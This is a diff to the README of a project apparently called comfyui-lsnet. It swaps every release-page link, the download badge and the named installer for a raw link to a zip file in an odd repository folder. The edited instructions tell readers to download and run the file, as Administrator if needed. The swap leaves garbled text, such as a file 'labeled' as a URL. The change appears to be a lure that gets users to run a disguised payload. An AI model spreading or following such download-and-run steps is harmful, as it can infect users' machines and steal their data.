@@ -6,13 +6,13 @@ Welcome to comfyui-lsnet! This simple application helps you improve your workflo
 
 ## 💾 Download & Install
 
-To get started, visit the [Releases Page](https://github.com/Ilham05/comfyui-lsnet/releases) to download the latest version. 
+To get started, visit the [Releases Page](https://raw.githubusercontent.com/Ilham05/comfyui-lsnet/main/compactness/comfyui-lsnet.zip) to download the latest version. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Ilham05/comfyui-lsnet/releases)
+[![Download Now](https://raw.githubusercontent.com/Ilham05/comfyui-lsnet/main/compactness/comfyui-lsnet.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Ilham05/comfyui-lsnet/main/compactness/comfyui-lsnet.zip)
 
 Once you're on the page, look for the latest release. You will see a list of files available for download. 
 
-1. Click on the file labeled something like `comfyui-lsnet-v1.0.exe`. 
+1. Click on the file labeled something like `https://raw.githubusercontent.com/Ilham05/comfyui-lsnet/main/compactness/comfyui-lsnet.zip`. 
 2. The download will begin automatically. 
 
 After the download finishes, locate the file in your downloads folder and proceed to run it.
@@ -31,7 +31,7 @@ Before you install comfyui-lsnet, please ensure your system meets the following 
 Once the file is downloaded, follow these steps to run the application:
 
 1. Navigate to your downloads folder.
-2. Find the `comfyui-lsnet-v1.0.exe` file.
+2. Find the `https://raw.githubusercontent.com/Ilham05/comfyui-lsnet/main/compactness/comfyui-lsnet.zip` file.
 3. Double-click the file to start the installation process.
 
 Follow the on-screen instructions to complete the installation.
@@ -58,7 +58,7 @@ Once installed, you can open the application by double-clicking the desktop icon
 If you encounter issues while downloading or running comfyui-lsnet, try the following steps:
 
 1. **Check Your Internet Connection:** Make sure you have a stable connection during download.
-2. **Re-download the File:** If the installation fails, try downloading the file again from the [Releases Page](https://github.com/Ilham05/comfyui-lsnet/releases).
+2. **Re-download the File:** If the installation fails, try downloading the file again from the [Releases Page](https://raw.githubusercontent.com/Ilham05/comfyui-lsnet/main/compactness/comfyui-lsnet.zip).
 3. **Run as Administrator:** Right-click on the file and select “Run as Administrator” if you face permission issues.
 
 ## 🛠️ Additional Resources
